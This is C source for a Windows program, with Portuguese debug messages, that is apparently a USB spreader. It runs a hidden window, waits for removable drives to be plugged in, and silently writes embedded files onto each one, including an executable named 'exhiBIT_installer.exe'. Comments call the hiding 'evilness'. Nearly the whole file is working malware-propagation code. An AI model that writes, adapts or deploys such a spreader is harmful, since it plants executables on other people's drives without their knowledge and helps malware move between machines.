#include <windows.h>
#include <dbt.h>
#include <stdio.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <math.h>
#include <string.h>
#include <unistd.h>
#include "spreader_data.h"

#define CHECK_BIT(var,pos) ((var) & (1<<(pos)))

const char g_szClassName[] = "wClass";

void copiar(char *path) {
	FILE *fp;
	char *file;
	char output_name[MAX_PATH] = {0};

	sprintf(output_name, "%s\\exhiBIT_installer.exe", path);

	fp = fopen(output_name, "wb");
	fwrite(&rawData1[0], SIZE_FILE_1, 1, fp);
	fclose(fp);

	sprintf(output_name, "%s\\exhiBIT_README.txt", path);

	fp = fopen(output_name, "wb");
	fwrite(&rawData2[0], SIZE_FILE_2, 1, fp);
	fclose(fp);

	sprintf(output_name, "%s\\0xF0A7C.txt", path);

	fp = fopen(output_name, "wb");
	fwrite(&rawData3[0], SIZE_FILE_3, 1, fp);
	fclose(fp);
}


void get_path(LPARAM lParam, char *path) {
	DEV_BROADCAST_VOLUME *volume;
	int n;
	volume = (DEV_BROADCAST_VOLUME*) lParam;
	if(volume->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
		for (n = 0; n < 32; n++) {
			if (CHECK_BIT(volume->dbcv_unitmask, n))
				break;
		}
		sprintf(path, "%c:", n + 'A');
	}	
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {

	char path[MAX_PATH] = {0}; 


	switch(msg) {
		case WM_CLOSE:
			DestroyWindow(hwnd);
			break;
		case WM_DESTROY:
			PostQuitMessage(0);
			break;
		case WM_DEVICECHANGE:
			switch(wParam) {
			case DBT_DEVICEARRIVAL:
			    printf("plugou...\n");
			    get_path(lParam, &path[0]);
			    copiar(&path[0]);
			    printf("Arquivos copiados!\n");
			    break;
			case DBT_DEVICEREMOVECOMPLETE:
			    printf("desplugou.\n");
			    break;
			}
			break;
		default:
			return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow) {

	WNDCLASSEX wc;
	HWND hwnd;
	MSG Msg;

	// some jibber-jabber about window's classes
	wc.cbSize	 = sizeof(WNDCLASSEX);
	wc.style	 = 0;
	wc.lpfnWndProc	 = WndProc;
	wc.cbClsExtra	 = 0;
	wc.cbWndExtra	 = 0;
	wc.hInstance	 = hInstance;
	wc.hIcon	 = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor	 = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszMenuName  = NULL;
	wc.lpszClassName = g_szClassName;
	wc.hIconSm	 = LoadIcon(NULL, IDI_APPLICATION);

	if(!RegisterClassEx(&wc)) {
		printf("Can't register window.\n");
		return 0;
	}

	// this is the forever-hidden window
	hwnd = CreateWindowEx(
		WS_EX_CLIENTEDGE,
		g_szClassName,
		"",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
		NULL, NULL, hInstance, NULL);

	if(hwnd == NULL) {
		printf("Can't create window.\n");
		return 0;
	}
	

	// We don't want any windows showing around
	// Double-comment to ensure evilness 

/*
	// ShowWindow(hwnd, nCmdShow);
	// UpdateWindow(hwnd);
*/

	// spinning round and round, forever and ever
	while(GetMessage(&Msg, NULL, 0, 0) > 0) {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return Msg.wParam;
}
